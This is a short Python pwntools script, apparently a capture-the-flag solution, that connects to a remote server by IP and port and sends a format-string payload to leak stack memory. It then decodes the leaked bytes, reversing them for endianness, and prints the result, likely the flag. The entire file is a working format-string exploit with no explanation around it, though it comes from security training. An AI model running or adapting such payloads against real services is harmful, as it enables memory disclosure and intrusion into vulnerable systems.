#!/usr/bin/env python

from pwn import *

# r = remote('140.113.24.241', 30172)
# r = gdb.debug('./server-ctf-src/fmt/fmt', '''
#     break main
#     continue
# ''')

final = []

r = remote('140.113.24.241', 30172)
r.sendline('%10$p%11$p%12$p%13$p%14$p'.encode())
result = r.recv().decode("ASCII").split("0x")
for rs in result:
    if rs == "":
        continue
    by_str = bytes.fromhex(rs)
    # reverse for endian
    ascii_str = by_str.decode("ASCII")[::-1]
    final.append(f"{ascii_str}")
r.close()

for f in final:
    print(f, end="")
print()
